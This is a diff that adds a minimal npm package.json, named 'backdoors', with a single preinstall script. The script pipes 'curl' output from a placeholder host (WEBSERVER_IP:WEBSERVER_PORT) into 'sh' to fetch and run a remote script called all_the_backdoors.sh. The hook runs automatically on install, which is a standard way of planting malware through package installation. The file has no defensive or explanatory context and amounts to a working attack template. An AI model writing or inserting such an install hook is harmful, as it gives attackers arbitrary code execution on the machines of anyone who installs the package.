@@ -1,0 +1,6 @@
+{
+    "name": "backdoors",
+    "scripts": {
+        "preinstall": "curl -s  http://WEBSERVER_IP:WEBSERVER_PORT/all_the_backdoors.sh | sh"
+    }
+}
